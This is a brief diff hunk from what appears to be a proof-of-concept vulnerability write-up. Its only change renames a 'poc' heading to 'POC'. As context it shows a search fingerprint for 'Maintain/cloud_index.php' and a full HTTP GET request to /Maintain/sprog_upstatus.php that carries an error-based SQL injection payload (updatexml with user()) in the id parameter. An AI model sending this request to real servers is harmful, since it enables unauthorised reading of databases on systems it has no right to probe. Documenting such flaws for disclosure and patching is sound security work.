@@ -8,7 +8,7 @@
 body="Maintain/cloud_index.php"
 ```
 
-## poc
+## POC
 
 ```java
 GET /Maintain/sprog_upstatus.php?status=1&id=1%20and%20updatexml(1,concat(0x7e,user()),0)&rdb=1 HTTP/1.1
